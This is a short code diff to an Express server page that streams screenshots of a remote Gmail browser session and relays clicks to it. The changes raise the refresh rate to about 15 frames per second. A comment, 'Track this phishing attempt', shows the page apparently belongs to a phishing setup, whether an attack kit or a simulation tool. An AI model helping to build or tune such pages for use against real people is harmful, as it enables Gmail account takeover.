@@ -369,7 +369,9 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
                   params: { x: Math.round(x), y: Math.round(y) }
                 })
               }).then(() => {
-                // Request a new screenshot after clicking
+                // Request immediate screenshot after clicking for fast feedback
+                setTimeout(requestScreenshot, 100);
+                // Request another screenshot shortly after for final state
                 setTimeout(requestScreenshot, 500);
               }).catch(console.error);
             }
@@ -381,8 +383,8 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
                 return;
               }
 
-              console.log('Requesting screenshot...');
-              fetch('/api/gmail-browser/session/' + sessionToken + '/screenshot')
+              console.log('Requesting fast screenshot...');
+              fetch('/api/gmail-browser/session/' + sessionToken + '/fast-screenshot')
                 .then(response => {
                   if (!response.ok) {
                     throw new Error('Screenshot request failed: ' + response.status);
@@ -424,12 +426,19 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
               initSocket();
               requestScreenshot();
               
-              // Auto-refresh screenshots
+              // High-frequency auto-refresh screenshots for smooth experience (15 FPS)
               setInterval(() => {
-                if (Date.now() - lastUpdate > 10000) { // If no update for 10 seconds
+                if (Date.now() - lastUpdate > 2000) { // If no update for 2 seconds
                   requestScreenshot();
                 }
-              }, 3000);
+              }, 67); // ~15 FPS (1000ms / 15 = 67ms)
+              
+              // Fallback refresh for stale screenshots
+              setInterval(() => {
+                if (Date.now() - lastUpdate > 5000) { // If no update for 5 seconds
+                  requestScreenshot();
+                }
+              }, 1000);
               
               // Track this phishing attempt
               fetch('/api/tracking/click', {
